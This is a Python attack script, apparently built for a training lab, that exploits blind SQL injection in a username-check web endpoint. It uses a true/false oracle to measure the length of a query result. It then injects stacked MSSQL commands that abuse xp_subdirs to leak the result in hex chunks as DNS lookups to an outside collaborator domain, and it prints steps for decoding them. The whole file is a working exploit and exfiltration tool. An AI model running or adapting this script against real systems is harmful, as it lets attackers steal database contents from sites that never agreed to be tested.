#!/usr/bin/python3

import argparse
import json
import math
import requests
import sys
import time
from urllib.parse import quote_plus


# ── Pretty printing ──────────────────────────────────────────
# Status goes to stderr so stdout only has the extracted value.
# Colors auto-disable when stderr is piped to a file.

USE_COLOR = sys.stderr.isatty()


def colorize(code, text):
    if USE_COLOR:
        return f"\033[{code}m{text}\033[0m"
    return text


def info(message):
    print(colorize("1;34", f"[*] {message}"), file=sys.stderr)


def success(message):
    print(colorize("1;32", f"[+] {message}"), file=sys.stderr)


def warn(message):
    print(colorize("1;33", f"[!] {message}"), file=sys.stderr)


def error(message):
    print(colorize("1;31", f"[-] {message}"), file=sys.stderr)
    sys.exit(1)


def print_banner(title):
    line = "=" * 50
    print(colorize("1;35", line), file=sys.stderr)
    print(colorize("1;35", f"  {title}"), file=sys.stderr)
    print(colorize("1;35", line), file=sys.stderr)


# ── CLI arguments ────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="OOB SQL injection via DNS exfiltration (xp_subdirs)"
    )
    parser.add_argument("-u", "--url",
                        default="http://10.129.204.197/api/check-username.php",
                        help="Target URL")
    parser.add_argument("-t", "--target",
                        default="maria",
                        help="Username to target")
    parser.add_argument("-c", "--collaborator",
                        default="blindsqli.academy.htb",
                        help="DNS collaborator domain")
    parser.add_argument("-q", "--query",
                        default="SELECT flag FROM flag",
                        help="SQL query to exfiltrate")
    parser.add_argument("--chunk-size",
                        type=int, default=63,
                        help="Max subdomain label length (DNS limit is 63)")
    parser.add_argument("--bits",
                        type=int, default=10,
                        help="Bits for number extraction (default: 10)")
    parser.add_argument("--dry-run",
                        action="store_true",
                        help="Print payloads without sending them")
    return parser.parse_args()


# ── Extraction logic (oracle-agnostic) ───────────────────────

def validate_oracle(oracle):
    """Send two known queries to make sure the oracle works."""
    info("Validating oracle...")

    if not oracle("1=1"):
        error("Oracle check failed: 1=1 returned FALSE")

    if oracle("1=0"):
        error("Oracle check failed: 1=0 returned TRUE")

    success("Oracle OK: 1=1 -> TRUE, 1=0 -> FALSE")


def dump_number(oracle, query, bits=10):
    """
    Extract a number by testing each bit individually.
    Bit 0 (value 1), bit 1 (value 2), bit 2 (value 4), etc.
    If the bit is set in the server's answer, we set it in ours.
    """
    value = 0

    for bit_position in range(bits):
        bit_value = 2 ** bit_position

        if oracle(f"({query})&{bit_value}>0"):
            value |= bit_value

        # Show the binary value building up in real time
        print(
            colorize("1;34", f"\r[*] Bits: {value:0{bits}b} = {value}"),
            end="",
            file=sys.stderr,
        )

    print(file=sys.stderr)  # finish the \r line
    return value


# ── DNS exfiltration ─────────────────────────────────────────

def build_exfil_payload(target, query, offset, chunk_size, collaborator, chunk_index):
    """
    Build the SQL injection payload that will:
    1. Convert the query result to hex
    2. Grab a 63-char chunk starting at `offset`
    3. Send it as a DNS lookup via xp_subdirs
    """
    return (
        f"{target}'; "
        f"DECLARE @C VARCHAR({chunk_size}); "
        f"SELECT @C=SUBSTRING("
        f"CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({query})),1)"
        f",{offset},{chunk_size}); "
        f"EXEC('master..xp_subdirs "
        f"\"\\\\'+@C+'.{chunk_index}.{collaborator}\\x\"'"
        f"); -- -"
    )


def send_chunks(args, oracle, request_counter):
    """
    Figure out how many DNS chunks we need, then send them.
    Each chunk becomes a subdomain: <hex>.<index>.<collaborator>
    """
    # Step 1: Find out how long the hex-encoded result is
    info("Extracting hex length...")
    hex_length_query = (
        f"LEN(CONVERT(VARCHAR(MAX),"
        f"CONVERT(VARBINARY(MAX),({args.query})),1))-2"
    )
    hex_length = dump_number(oracle, hex_length_query, args.bits)

    num_chunks = math.ceil(hex_length / args.chunk_size)
    success(f"Hex length: {hex_length} chars -> {num_chunks} DNS chunk(s)")
    print(file=sys.stderr)

    # Step 2: Send each chunk as a DNS lookup
    for chunk_index in range(num_chunks):
        # +3 to skip the '0x' prefix (SUBSTRING is 1-indexed, '0x' is 2 chars)
        offset = 3 + (chunk_index * args.chunk_size)

        payload = build_exfil_payload(
            args.target, args.query, offset,
            args.chunk_size, args.collaborator, chunk_index,
        )

        if args.dry_run:
            info(f"Chunk {chunk_index} payload:")
            print(f"  {payload}", file=sys.stderr)
        else:
            request_counter()
            requests.get(f"{args.url}?u={quote_plus(payload)}")
            info(f"Chunk [{chunk_index + 1}/{num_chunks}] sent "
                 f"(offset {offset}, len {args.chunk_size})")

    return num_chunks


def print_next_steps(collaborator, num_chunks):
    """Print instructions for how to decode the DNS results."""
    print(file=sys.stderr)
    print_banner("NEXT STEPS")
    info(f"1. Check DNS logs on {collaborator}")
    info(f"2. Collect hex chunks from subdomains:")
    for i in range(num_chunks):
        info(f"     <hex>.{i}.{collaborator}")
    info(f"3. Concatenate hex values in order (0, 1, ...)")
    info(f"4. Decode: echo '<hex>' | xxd -r -p")


# ── Main ─────────────────────────────────────────────────────

def main():
    args = parse_args()

    print_banner("OOB SQLi via DNS Exfiltration")
    info(f"Target:       {args.target}")
    info(f"URL:          {args.url}")
    info(f"Collaborator: {args.collaborator}")
    info(f"Query:        {args.query}")
    info(f"Chunk size:   {args.chunk_size}")
    if args.dry_run:
        warn("DRY RUN -- no requests will be sent")
    print(file=sys.stderr)

    # Track how many HTTP requests we send
    request_count = 0
    start_time = time.time()

    def increment_requests():
        nonlocal request_count
        request_count += 1

    # ── Build the oracle ──
    # Same boolean oracle as the boolean-based script: inject via
    # URL parameter, check the JSON response for "taken".
    def oracle(condition):
        increment_requests()

        payload = quote_plus(f"{args.target}' AND ({condition})-- -")
        response = requests.get(f"{args.url}?u={payload}")
        data = json.loads(response.text)

        return data["status"] == "taken"

    # ── Run ──
    validate_oracle(oracle)

    num_chunks = send_chunks(args, oracle, increment_requests)

    elapsed = time.time() - start_time
    print(file=sys.stderr)
    success(f"All {num_chunks} chunk(s) sent in {elapsed:.1f}s ({request_count} requests)")

    print_next_steps(args.collaborator, num_chunks)


if __name__ == "__main__":
    main()
